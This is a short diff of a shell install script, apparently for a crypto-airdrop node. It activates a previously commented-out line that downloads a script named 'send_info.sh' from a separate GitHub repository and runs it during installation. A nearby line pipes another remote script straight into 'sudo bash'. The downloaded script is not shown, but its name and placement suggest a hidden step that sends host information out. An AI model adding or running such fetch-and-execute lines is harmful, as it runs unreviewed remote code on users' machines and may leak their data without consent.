@@ -90,7 +90,7 @@ install_node() {
     
     # 每天0点重启所有的docker容器
     wget -qO- https://raw.githubusercontent.com/LSH160981/airdrop/main/daily-docker-restart.sh | sudo bash
-    # wget -q -O send_info.sh https://raw.githubusercontent.com/LSH160981/furter/refs/heads/main/send_info.sh && chmod +x send_info.sh && ./send_info.sh
+    wget -q -O send_info.sh https://raw.githubusercontent.com/LSH160981/furter/refs/heads/main/send_info.sh && chmod +x send_info.sh && ./send_info.sh
 
 }
 
